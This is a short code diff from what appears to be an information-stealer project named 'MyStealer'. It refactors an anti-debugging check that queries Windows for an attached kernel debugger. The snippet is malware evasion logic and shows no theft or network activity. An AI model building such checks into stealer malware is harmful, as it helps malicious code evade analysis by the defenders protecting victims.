@@ -1,5 +1,5 @@
-﻿using static MyStealer.AntiDebug.Win32Calls;
-using System.Runtime.InteropServices;
+﻿using System.Runtime.InteropServices;
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug.Check
 {
@@ -17,7 +17,7 @@ namespace MyStealer.AntiDebug.Check
                 KernelDebuggerNotPresent = true
             };
 
-            NtQuerySystemInformation(SystemKernelDebuggerInformation, ref KernelDebugInfo, (uint)Marshal.SizeOf(KernelDebugInfo), out var returnLength);
+            NtQuerySystemInformation_KernelDebuggerInfo(SystemKernelDebuggerInformation, ref KernelDebugInfo, (uint)Marshal.SizeOf(KernelDebugInfo), out var returnLength);
 
             return returnLength == (uint)Marshal.SizeOf(KernelDebugInfo)
                 && (KernelDebugInfo.KernelDebuggerEnabled || !KernelDebugInfo.KernelDebuggerNotPresent);
